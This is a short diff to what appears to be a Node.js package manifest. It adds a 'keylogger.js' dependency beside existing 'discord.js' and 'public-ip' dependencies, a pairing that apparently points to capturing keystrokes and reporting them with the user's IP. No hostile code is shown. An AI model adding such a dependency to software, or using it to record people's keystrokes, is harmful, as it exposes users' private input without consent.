@@ -10,6 +10,7 @@
   "license": "ISC",
   "dependencies": {
     "discord.js": "^13.6.0",
+    "keylogger.js": "^0.0.4",
     "public-ip": "^5.0.0"
   }
 }
